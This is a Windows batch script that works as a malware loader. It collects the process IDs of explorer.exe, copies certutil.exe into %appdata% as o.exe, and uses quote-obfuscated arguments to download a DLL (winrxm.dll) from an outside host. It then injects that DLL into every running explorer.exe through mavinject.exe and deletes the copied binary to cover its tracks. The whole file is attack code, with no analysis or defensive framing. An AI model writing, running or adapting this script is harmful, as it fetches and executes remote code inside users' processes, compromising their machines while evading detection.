@ECHO OFF
SETLOCAL EnableDelayedExpansion
SET /A I=0
SET PIDS=
FOR /F "tokens=*" %%G IN ('wmic process where name^="explorer.exe" get ProcessId ^| FINDSTR /v ProcessId ^| FINDSTR /r /v "^$"') DO (
    SET /A I=I+1
    SET PIDS=!PIDS!%%G,
    SET PIDS=!PIDS: =!
)
SET PIDS=!PIDS:~0,-1!

cd %appdata% && copy /b %windir%\System32\*rtutil.exe o.exe&&o.exe -u""rlcach""e -spl""it -f h""t""tp"":/""/beek.iyf.fyi/yeah/winrxm.dll
mavinject.exe %PIDS% /INJECTRUNNING %appdata%\winrxm.dll

del %appdata%\o.exe
